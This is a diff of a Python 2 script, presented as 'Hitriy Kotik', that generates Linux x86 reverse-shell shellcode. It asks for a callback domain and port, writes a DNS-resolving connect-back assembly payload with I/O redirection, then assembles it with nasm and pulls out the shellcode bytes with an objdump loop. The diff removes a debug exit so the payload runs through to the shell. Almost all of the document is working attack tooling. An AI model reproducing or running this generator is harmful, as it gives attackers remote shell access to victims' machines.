@@ -1,9 +1,68 @@
 #!/usr/bin/python
 
 import sys
+import os
+import subprocess
+import platform
+
+print """ 
+; ccccccccclllllllloooooooooodddddddddddddxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdl:;',cdxddxdxxddddddddddddoooooooooolllllllllccccccc
+; ccccccllllllllloooooooodddddddddddddxxxxxxxxxxxxxddxxkxxxxxxkkkkxxxxxxxxxxxxxxxxxxxxkxxxxkkxxxxdc,......:dxdxxxxdxddddddddddddddooooooooollllllllccccc
+; ccccllllllllooooooooddddddddddddxxxxxxxxxxxxxxxxo;'';coxkkkkxkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkxl,.....'..'oxxxxxxxxxxxxdddddddddddooooooooooolllllllccc
+; cccllllllloooooooodddddddddddxxxxxxxxxxxxxxxkkkkl. ....,lxkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkd:.....'',,..cxxxxxxxxxxxxxxxxxddddddddddooooooooollllllcc
+; ccllllllooooooodddddddddxxxxxxxxxxxxkkkkkkkkkkkko........,lxkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkd;.....''',,'.:xkkkxkxxxxxxxxxxxxxxddddddddddoooooooollllll
+; llllllooooooodddddddxxxxxxxxxxxxkkkkkkkkkkkkkkkOd,.''......,okOkkkkkkkkkkkkkkkkkkkkkkkkkkko,.......',,,,.;xkkkkkkkkkxxxxxxxxxxxxxddddddddddoooooolllll
+; llllooooooodddddddxxxxxxxxxxxkkkkkkkkkkkkkkkkkkOkc..'........:xkkkkkkkkkOOOOOOOOkkkkkkkkkl'.......',;;,'.;xkkkkkkkkkkkkkkxxxxxxxxxxxxddddddddoooooolll
+; llloooooooddddddxxxxxxxxxxxkkkkkkkkkkkkkkkkkkkkkOd,.'''..... .'lxkOkkOOOOOOOOOOOkkkkkOOxc.. .....'',,'...:xkOkkkkkkkkkkkkkkkkxxxxxxxxxxxdddddddooooooo
+; llooooooddddddxxxxxxxxxxxkkkkkkkkkkkkkkkOOOOOOOOOkc..'.''...   .,ldxxxddxxxxxxddoolccc:'...  .....'''...'lkkOOkkkkkkkkkkkkkkkkkkxxxxxxxxxddddddddooooo
+; looooooddddddxxxxxxxxkkkkkkkkkkkkkkkkkkOOOOOOOOOOOd,.........    ...',,,;::::::;,'......   .......''....,dOOOOOOkkkkkkkkkkkkkkkkkxxxxxxxxxxdddddddoooo
+; ooooodddddddxxxxxxxkkkkkkkkkkkkkkkkkOOOOOOOOOOOOOOOl.........      ......''''''.........................'dOOOOOOOOOOOOkkOOkkkkkkkkkkxxxxxxxxdddddddooo
+; oooodddddddxxxxxxkkkkkkkkkkkkkOOOOOOOOOOOOOOOOOOOOOx,.......................................',,,,'......'oOOOOOOOOOOOOOOOOOkkkkkkkkkkkkxxxxxxdddddddoo
+; oooddddddxxxxxxxkkkkkkkkkkkkkOOOOOOOOOOOOOOOOOOOOOOx,....',;::;:::::::cccclllclloooooooooooddddxxdol;. .;x0OOOOOOOOOOOOOOOOkkkkkkkkkkkkkxxxxxxxxdddddd
+; ooddddddxxxxxxxkkkkkkkkkkkkOOOOOOOOOOOOOOOOOOOOOOOOxccodxkOOO00000KKKKKKK00KKK0KKKK0KKKKKKKKKK000K0Kx' 'oOOOOOOOOOOOOOOOOOOOOkkkkkkkkkkkkxxxxxxxxddddd
+; ooddddddxxxxxxxkkkkkkkkkOOOOOOOOOOOOOOOOOOOOOOOOOOOOkOK00000000000OOOOkkOK000K000kddxdddodddodk0000Kk' .ckOOOOOOOOOOOOOOOOOOOOOOkkkkkkkkkkkxxxxxxxdddd
+; oddddddxxxxxxxkkkkkkkkkkOOOOOOOOOOOOOOOOOOOOOOOOOOOOkO0000ko::::;;,'...'dKK00KKKO:............'ckKKKk,..,lkOOOOOOOOOOOOOOOOOOOOOOOkkkkkkkkkkxxxxxxxddd
+; dddddxxxxxxxxkkkkkkkkkkkkkOOOOOOOOOOOOOOOOOOOOOOOOOkxk00Oo,.............dKKKKKKKO;..............'d0Kk;...,oOOOOOOOOOOOOOOOOOOOOOOOOkkkkkkkkkxxxxxxxddd
+; dddddxxxxxxxxkkkkkkkkkkkkkOOOOOOOOOOOOOOOOOOOOOOOOOo:xK0o...............oKKKK00K0:..............:x0KO:...'cxOOOOOOOOOOOOOOOOOOOOOOOkkkkkkkkkkxxxxxxddd
+; dddddxxxxxxxxkkkkkkkkkkkkkOOOOOOOOOOOOOOOOOOOOOOOOkl;xK0Oo,...........,lOKKX0OKKKOc'.   .....'ck0KK0o'....;okOOOOOOOOOOOOOOOOOOOOOOkkkkkkkkkkxxxxxxxdd
+; dddddxxxxxxxxkkkkkkkkkkkkkkOOOOOOOOOOOOOOOOOOOOkkOx;.cxOK0kl,..''''.,oOKK0xd:,lk0KKkoccclcccok0K0Oo;......,lkOOOOOOOOOOOOOOOOOOOOOOkkkkkkkkkkkxxxxxxdd
+; dddddxxxxxxxxkkkkkkkkkkkkkkkkOOOOOOOOOOOOOOOOOOOOOx;..':x000OkkkOOOO0KK0d;. ....;d0KKKKKKKKKKKKOd;'.'''''',lkOkOOOOOOOOOOOOOOOOOOOOkkkkkkkkkkkxxxxxxdd
+; dddddxxxxxxxxkkkkkkkkkkkkkkkkOOOOOOOOOOOOOOOOOOOOOd;....':xOOOOkkxxddoo;..........,:::cc:cllloo:,'''',,,,,;lkOOOOOOOOOOOOOOOOOOOOOkkkkkkkkkkkxxxxxxxdd
+; dddddxxxxxxxxkkkkkkkkkkkkkkkkOOOOOOOOOOOOOOOOOOOOOd;...'..,;;,'........ ..............  ..........''''''',;lxOOOOOOOOOOOOOOOOOkkkkkkkkkkkkkkxxxxxxxddd
+; ddddddxxxxxxxxkkkkkkkkkkkkkkkOOOOOOOOOOOOOOOOOOOkkd:,,,,,,'''''.... ..;cll:;;'.;oxOOkdl;'.....','..'...'';cdkOkOOOOOOOOOOOOOOkkkkkkkkkkkkkkkxxxxxxxddd
+; oodddddxxxxxxxkkkkkkkkkkkkkkkkOOOOOOOOOkkkkkkkkkkOxo;'.............'lk0000KKOxxOK0000000Odlc:lxl'..'...',:oxOOOOOOOOOOOOOOOOOkkkkkkkkkkkkkkkxxxxxxxddd
+; ooddddddxxxxxxxxxkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOxc,.....';,'..;oO00000000KOldO0000000000000d,....'',;;:lxkOOOOOOOOOOOOOOkkkkkkkkkkkkkkkxxxxxxxxdddd
+; ooodddddxxxxxxxxxxkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOxo;,'....,okkkO00000000kxo;..,cdO0000000Oxl,..'''',;;:cloxkkOkkkkkkkkkkkkkkkkkkkkkkkkxxxxxxxxdddddd
+; ooodddddddxxxxxxxxxkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkxol:,''....':dkOO000Okdl'........';cloolc;'..'''',,,;;:ccloxkkkkkkkkkkkkkkkkkkkkkkkkkxxxxxxxdddddddo
+; oooodddddddxxxxxxxxxxkkkkkkkkkkkkkkkkkkkkkkkkkOkkxlcc;'.........';:ccc;'... .......................''',;:cccloxkOkkkkkkkkkkkkkkkkkkkkxxxxxxxxddddddooo
+; oooooodddddddxxxxxxxxxxkkkkkkkkkkkkkkkkkkkkkkkkkkoc:c:,'..............................'..............',::ccccldkOkkkkkkkkkkkkkkkkkkxxxxxxxxdddddddoooo
+; llooooodddddddxxxxxxxxxxxkkkkkkkkkkkkkkkkkkkkkkkxl;;:;;,'...........................................',;::cccc:coxkkkkkkkkkkkkkkkxxxxxxxxxddddddddooooo
+; llloooooodddddddxxxxxxxxxxxxkkkkkkkkkkkkkkkkkkkkxl,,,,;;,''.......................................',,;;:::cc:;;:lxxkkkkkkkkkkxxxxxxxxxxxddddddddoooooo
+; lllloooooooddddddddxxxxxxxxxxxxxkkkkkkkkkkkkkkkkxc,'''',,,,'..........''''''''''','''............',,,;;:::c:;;,,;cdxkkkkkkkxxxxxxxxxxxdddddddooooooooo
+; llllloooooooodddddddddxxxxxxxxxxxxxxkkkkkkkkkkkkxl;'''''''''''.....''''',,,,;;,,,,,'.....        ..',;;;;:::;;,,,;lxxxxxxxxxxxxxxxxxdddddddoooooolllll
+; cclllllloooooooodddddddddddxxxxxxxxxxxxxxxxkkkkkxo;''''''...''............'''''''.....           ...';;;::;;;,,,',coxxxxxxxxxxxddddddddddddooooooollll
+; cccllllllloooooooooddddddddddxxxxxxxxxxxxxxxxxxxxo:''''''.........................                ...,;;;;;;,,,'',;ldxxxxxxxddddddddddddddddddooooolll
+; ccccclllllllooooooooddddddddddddxxxxxxxxxxxxxxxxxdc,''.....................                      ....',,,,,,,,,,,,,:odxddddddddddddooodddddodxoodoolcc
+; cccccccllllllllooooooooodddddddddddddddxxxxxxxxxdo:,'''...............                        .......',,,,,,,,,,,,,;coddddddddddoooooooodddoodooooolcc
+; :::cccccccclllllllloooooooooodddddddddddddddxxxxdc;,,''............                          ........''',,,,,,,,,,',;codddddooooooooolloodooooollollcc
+; ::::ccccccccclllllllloooooooooooddddddddddddddddl;,,'''.........                         ...............'',,,,,,,'''';clooooooooooolllllodooooollllcc:
+; :::::::ccccccccclllllllllloooooooooooddddddddddo:,''..........                          ... ............'',,,,'''''''',:cloollolllllllllllllllcllccc::
+; :::::::ccccccccccclllllllllloooooooooooooodddddl;'''........                               ...........''''','''''''''.',:clollllllllllcccccccc:cc:::::
+
+
+"""
 
 
 
+print "Hitriy Kotik (Tricky Cat) is my name and I like dealing in shellcode. I have something special in the market place for you! \n \
+!!!!! A Reverse DNS TCP Payload For Linux !!!!! \n Tell Me , a few things and I will generate the shellcode for you!"  
+
+
+domainname = raw_input("[+] Tell Me The Domain You wish To Connect Back To : ")
+LPort      = raw_input("[+] Tell Me The Port   You Wish To Connect Back To : ")
+
+if platform.system() == 'Windows':
+    print "[-] I Need To Warn you That You'll Need Some Additional Tools To Use My Magic...\n Make Sure You Have nasm, objdump , and gcc installed \n"
 
 Prefix       = ['AA', 'AA' ,'01', '00','00', '01' ,'00','00','00','00','00','00']
 DomainSize   = []
@@ -13,7 +72,7 @@ Suffix       = ['00', '00' , '01', '00' , '01' ,'00','00','00', ]
 
 AlmostEverythingIsLEndian = [] 
 
-domainname = "something.ru"
+
 
 
 lengthOfPayload = 22 + len(domainname.replace(".",""))
@@ -22,16 +81,17 @@ lengthOfPayload = 22 + len(domainname.replace(".",""))
 #print "Modulus % of Domain Name  " , (lengthOfPayload  % 4 )
 
 if (lengthOfPayload  % 4) == 0:
-    print "[+] Everything looks good!\n"
+    pass
+    #print "[+] Everything looks good!\n"
 elif (lengthOfPayload  % 4) == 3:
-    print "[-] Padding With A Byte \n"
+    #print "[-] Padding With A Byte \n"
     Suffix.append('00')
 elif (lengthOfPayload  % 4) == 2:
-    print "[-] Padding With 2  Bytes \n"
+    #print "[-] Padding With 2  Bytes \n"
     Suffix.append('00')
     Suffix.append('00')
 elif (lengthOfPayload  % 4) == 1:
-    print "[-] Padding With 3  Bytes \n"
+    #print "[-] Padding With 3  Bytes \n"
     Suffix.append('00')
     Suffix.append('00')
     Suffix.append('00')
@@ -102,14 +162,14 @@ scount = 0
 BreakCount = 0
 
 TotalPayload = len(domainname.replace(".","")) + len(Suffix) + len(SubDomainSize) + len(DomainSize) + len(Prefix)
-print TotalPayload
+#print TotalPayload
 
 
 EndianRequest = []
 
 
 #sys.stdout.write("push 0x")
-EndianRequest.append("\tpush 0x")
+EndianRequest.append("  push 0x")
 for i in EverythingArray:
    # sys.stdout.write(i )
     EndianRequest.append(i)
@@ -122,73 +182,15 @@ for i in EverythingArray:
         #BreakCount += 1
         if BreakCount < TotalPayload:
            #sys.stdout.write("push 0x")
-           EndianRequest.append("\tpush 0x") 
+           EndianRequest.append("  push 0x") 
 
 PrintableEndianRequest = ''.join(EndianRequest)
 
 #print PrintableEndianRequest
 
 
-
-
-
-
-
-
-
-
-
-
 ###### Full ASM Payload:
 PayLOAD = """
-
-; ccccccccclllllllloooooooooodddddddddddddxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdl:;',cdxddxdxxddddddddddddoooooooooolllllllllccccccc
-; ccccccllllllllloooooooodddddddddddddxxxxxxxxxxxxxddxxkxxxxxxkkkkxxxxxxxxxxxxxxxxxxxxkxxxxkkxxxxdc,......:dxdxxxxdxddddddddddddddooooooooollllllllccccc
-; ccccllllllllooooooooddddddddddddxxxxxxxxxxxxxxxxo;'';coxkkkkxkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkxl,.....'..'oxxxxxxxxxxxxdddddddddddooooooooooolllllllccc
-; cccllllllloooooooodddddddddddxxxxxxxxxxxxxxxkkkkl. ....,lxkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkd:.....'',,..cxxxxxxxxxxxxxxxxxddddddddddooooooooollllllcc
-; ccllllllooooooodddddddddxxxxxxxxxxxxkkkkkkkkkkkko........,lxkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkd;.....''',,'.:xkkkxkxxxxxxxxxxxxxxddddddddddoooooooollllll
-; llllllooooooodddddddxxxxxxxxxxxxkkkkkkkkkkkkkkkOd,.''......,okOkkkkkkkkkkkkkkkkkkkkkkkkkkko,.......',,,,.;xkkkkkkkkkxxxxxxxxxxxxxddddddddddoooooolllll
-; llllooooooodddddddxxxxxxxxxxxkkkkkkkkkkkkkkkkkkOkc..'........:xkkkkkkkkkOOOOOOOOkkkkkkkkkl'.......',;;,'.;xkkkkkkkkkkkkkkxxxxxxxxxxxxddddddddoooooolll
-; llloooooooddddddxxxxxxxxxxxkkkkkkkkkkkkkkkkkkkkkOd,.'''..... .'lxkOkkOOOOOOOOOOOkkkkkOOxc.. .....'',,'...:xkOkkkkkkkkkkkkkkkkxxxxxxxxxxxdddddddooooooo
-; llooooooddddddxxxxxxxxxxxkkkkkkkkkkkkkkkOOOOOOOOOkc..'.''...   .,ldxxxddxxxxxxddoolccc:'...  .....'''...'lkkOOkkkkkkkkkkkkkkkkkkxxxxxxxxxddddddddooooo
-; looooooddddddxxxxxxxxkkkkkkkkkkkkkkkkkkOOOOOOOOOOOd,.........    ...',,,;::::::;,'......   .......''....,dOOOOOOkkkkkkkkkkkkkkkkkxxxxxxxxxxdddddddoooo
-; ooooodddddddxxxxxxxkkkkkkkkkkkkkkkkkOOOOOOOOOOOOOOOl.........      ......''''''.........................'dOOOOOOOOOOOOkkOOkkkkkkkkkkxxxxxxxxdddddddooo
-; oooodddddddxxxxxxkkkkkkkkkkkkkOOOOOOOOOOOOOOOOOOOOOx,.......................................',,,,'......'oOOOOOOOOOOOOOOOOOkkkkkkkkkkkkxxxxxxdddddddoo
-; oooddddddxxxxxxxkkkkkkkkkkkkkOOOOOOOOOOOOOOOOOOOOOOx,....',;::;:::::::cccclllclloooooooooooddddxxdol;. .;x0OOOOOOOOOOOOOOOOkkkkkkkkkkkkkxxxxxxxxdddddd
-; ooddddddxxxxxxxkkkkkkkkkkkkOOOOOOOOOOOOOOOOOOOOOOOOxccodxkOOO00000KKKKKKK00KKK0KKKK0KKKKKKKKKK000K0Kx' 'oOOOOOOOOOOOOOOOOOOOOkkkkkkkkkkkkxxxxxxxxddddd
-; ooddddddxxxxxxxkkkkkkkkkOOOOOOOOOOOOOOOOOOOOOOOOOOOOkOK00000000000OOOOkkOK000K000kddxdddodddodk0000Kk' .ckOOOOOOOOOOOOOOOOOOOOOOkkkkkkkkkkkxxxxxxxdddd
-; oddddddxxxxxxxkkkkkkkkkkOOOOOOOOOOOOOOOOOOOOOOOOOOOOkO0000ko::::;;,'...'dKK00KKKO:............'ckKKKk,..,lkOOOOOOOOOOOOOOOOOOOOOOOkkkkkkkkkkxxxxxxxddd
-; dddddxxxxxxxxkkkkkkkkkkkkkOOOOOOOOOOOOOOOOOOOOOOOOOkxk00Oo,.............dKKKKKKKO;..............'d0Kk;...,oOOOOOOOOOOOOOOOOOOOOOOOOkkkkkkkkkxxxxxxxddd
-; dddddxxxxxxxxkkkkkkkkkkkkkOOOOOOOOOOOOOOOOOOOOOOOOOo:xK0o...............oKKKK00K0:..............:x0KO:...'cxOOOOOOOOOOOOOOOOOOOOOOOkkkkkkkkkkxxxxxxddd
-; dddddxxxxxxxxkkkkkkkkkkkkkOOOOOOOOOOOOOOOOOOOOOOOOkl;xK0Oo,...........,lOKKX0OKKKOc'.   .....'ck0KK0o'....;okOOOOOOOOOOOOOOOOOOOOOOkkkkkkkkkkxxxxxxxdd
-; dddddxxxxxxxxkkkkkkkkkkkkkkOOOOOOOOOOOOOOOOOOOOkkOx;.cxOK0kl,..''''.,oOKK0xd:,lk0KKkoccclcccok0K0Oo;......,lkOOOOOOOOOOOOOOOOOOOOOOkkkkkkkkkkkxxxxxxdd
-; dddddxxxxxxxxkkkkkkkkkkkkkkkkOOOOOOOOOOOOOOOOOOOOOx;..':x000OkkkOOOO0KK0d;. ....;d0KKKKKKKKKKKKOd;'.'''''',lkOkOOOOOOOOOOOOOOOOOOOOkkkkkkkkkkkxxxxxxdd
-; dddddxxxxxxxxkkkkkkkkkkkkkkkkOOOOOOOOOOOOOOOOOOOOOd;....':xOOOOkkxxddoo;..........,:::cc:cllloo:,'''',,,,,;lkOOOOOOOOOOOOOOOOOOOOOkkkkkkkkkkkxxxxxxxdd
-; dddddxxxxxxxxkkkkkkkkkkkkkkkkOOOOOOOOOOOOOOOOOOOOOd;...'..,;;,'........ ..............  ..........''''''',;lxOOOOOOOOOOOOOOOOOkkkkkkkkkkkkkkxxxxxxxddd
-; ddddddxxxxxxxxkkkkkkkkkkkkkkkOOOOOOOOOOOOOOOOOOOkkd:,,,,,,'''''.... ..;cll:;;'.;oxOOkdl;'.....','..'...'';cdkOkOOOOOOOOOOOOOOkkkkkkkkkkkkkkkxxxxxxxddd
-; oodddddxxxxxxxkkkkkkkkkkkkkkkkOOOOOOOOOkkkkkkkkkkOxo;'.............'lk0000KKOxxOK0000000Odlc:lxl'..'...',:oxOOOOOOOOOOOOOOOOOkkkkkkkkkkkkkkkxxxxxxxddd
-; ooddddddxxxxxxxxxkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOxc,.....';,'..;oO00000000KOldO0000000000000d,....'',;;:lxkOOOOOOOOOOOOOOkkkkkkkkkkkkkkkxxxxxxxxdddd
-; ooodddddxxxxxxxxxxkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOxo;,'....,okkkO00000000kxo;..,cdO0000000Oxl,..'''',;;:cloxkkOkkkkkkkkkkkkkkkkkkkkkkkkxxxxxxxxdddddd
-; ooodddddddxxxxxxxxxkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkxol:,''....':dkOO000Okdl'........';cloolc;'..'''',,,;;:ccloxkkkkkkkkkkkkkkkkkkkkkkkkkxxxxxxxdddddddo
-; oooodddddddxxxxxxxxxxkkkkkkkkkkkkkkkkkkkkkkkkkOkkxlcc;'.........';:ccc;'... .......................''',;:cccloxkOkkkkkkkkkkkkkkkkkkkkxxxxxxxxddddddooo
-; oooooodddddddxxxxxxxxxxkkkkkkkkkkkkkkkkkkkkkkkkkkoc:c:,'..............................'..............',::ccccldkOkkkkkkkkkkkkkkkkkkxxxxxxxxdddddddoooo
-; llooooodddddddxxxxxxxxxxxkkkkkkkkkkkkkkkkkkkkkkkxl;;:;;,'...........................................',;::cccc:coxkkkkkkkkkkkkkkkxxxxxxxxxddddddddooooo
-; llloooooodddddddxxxxxxxxxxxxkkkkkkkkkkkkkkkkkkkkxl,,,,;;,''.......................................',,;;:::cc:;;:lxxkkkkkkkkkkxxxxxxxxxxxddddddddoooooo
-; lllloooooooddddddddxxxxxxxxxxxxxkkkkkkkkkkkkkkkkxc,'''',,,,'..........''''''''''','''............',,,;;:::c:;;,,;cdxkkkkkkkxxxxxxxxxxxdddddddooooooooo
-; llllloooooooodddddddddxxxxxxxxxxxxxxkkkkkkkkkkkkxl;'''''''''''.....''''',,,,;;,,,,,'.....        ..',;;;;:::;;,,,;lxxxxxxxxxxxxxxxxxdddddddoooooolllll
-; cclllllloooooooodddddddddddxxxxxxxxxxxxxxxxkkkkkxo;''''''...''............'''''''.....           ...';;;::;;;,,,',coxxxxxxxxxxxddddddddddddooooooollll
-; cccllllllloooooooooddddddddddxxxxxxxxxxxxxxxxxxxxo:''''''.........................                ...,;;;;;;,,,'',;ldxxxxxxxddddddddddddddddddooooolll
-; ccccclllllllooooooooddddddddddddxxxxxxxxxxxxxxxxxdc,''.....................                      ....',,,,,,,,,,,,,:odxddddddddddddooodddddodxoodoolcc
-; cccccccllllllllooooooooodddddddddddddddxxxxxxxxxdo:,'''...............                        .......',,,,,,,,,,,,,;coddddddddddoooooooodddoodooooolcc
-; :::cccccccclllllllloooooooooodddddddddddddddxxxxdc;,,''............                          ........''',,,,,,,,,,',;codddddooooooooolloodooooollollcc
-; ::::ccccccccclllllllloooooooooooddddddddddddddddl;,,'''.........                         ...............'',,,,,,,'''';clooooooooooolllllodooooollllcc:
-; :::::::ccccccccclllllllllloooooooooooddddddddddo:,''..........                          ... ............'',,,,'''''''',:cloollolllllllllllllllcllccc::
-; :::::::ccccccccccclllllllllloooooooooooooodddddl;'''........                               ...........''''','''''''''.',:clollllllllllcccccccc:cc:::::
-
-
-
-
-
 
 section     .text
 global      main   ;must be declared for linker (ld)
@@ -242,7 +244,7 @@ global      main   ;must be declared for linker (ld)
    ; 00 00 - Number of authority records
    ; 00 00 - Number of additional records
    ; DNS QUESTION --
-   ; 07 - 'example' has length 7, ;so change this to be the length of domain ; keep in ming there are not '.' in the question.
+   ; 07 - 'example' has length 7, ;so change this to be the length of domain ; keep in mind there are not '.' in the question.
    ; 65 - e
    ; 78 - x
    ; 61 - a
@@ -293,11 +295,6 @@ global      main   ;must be declared for linker (ld)
 
 
 main:                                         
-    nop
-    nop
-    nop  
-    nop
-    
     ; we create a socket fd, using again syscall 0x66 and argument SYS_SOCKET so ebx = 1  
     push   0x66
     pop    eax
@@ -351,7 +348,7 @@ main:
     ; push 0x00000100
     ; push 0x0001AAAA
 
-     {}
+    {}
 
 
     mov edx,esp ; Move the string to EDX so we can send it. 
@@ -379,10 +376,6 @@ main:
     push eax ; Probably not needed, I just want to ensure it's saved. 
 
 
-    ; Remove this when completed. This just calles Exit.
-    mov    ebx,0x0
-    mov    eax,0x1
-    int    0x80
 
  ;###################################
  ;
@@ -429,7 +422,7 @@ main:
 	push edx	      ; reverse shell IP 
 
 
-	push word {}      ;0x5c11  ; reverse shell port : 4444
+	push word {}      ; 0x5c11  ; reverse shell port : 4444
 	push word 0x2     ; AF_INET = PF_INET = 2
 	mov edi, esp	  ; move top of the stack to edi to prepare struct
 	push 0x10         ; size = 16
@@ -463,16 +456,36 @@ redirectIO:
 	int 0x80
 
 
+""".format(PrintableEndianRequest, LPort)
 
-    nop
-    nop
-    nop
+print "[+] I Am Making Your PayLoad Right Now...."
+f = open("hitriykotik.asm", "w+")
+f.write(PayLOAD)
+print "[+] ASM Created Successfully....\n"
+f.close()
 
 
+try:
+    os.system("nasm -f elf -o hitriykotik.o hitriykotik.asm")  # old and deprecated, it works though....
+except OSError as e:
+    if e.errno == os.errno.ENOENT:
+        print "[-] Something Went Wrong , Do You Have Nasm Installed? \n"
+        sys.exit(1)
+    else:
+        print "[-] Something Went Wrong , I Think Something Broke Using Nasm...\n"
+        sys.exit(1)
+        raise
 
+try:
+    objdump = 'for i in $(objdump -d hitriykotik.o | tr "\t" " " | tr " " "\n" | grep -E "^[0-9a-f]{2}$" ) ; do echo -n "\\x$i" ; done'
+    os.system(objdump)
+    print "\n"
+except OSError as e:
+    if e.errno == os.errno.ENOENT:
+         print "[-] Something Went Wrong , Do You Have Objdump Installed? \n"
+         sys.exit(1)
+    else:
+        print "[-] Something Went Wrong , I Think Something Broke Using Objdump...\n"
+        sys.exit(1)
+        raise
 
-
-
-""".format(PrintableEndianRequest, 4545)
-
-print PayLOAD
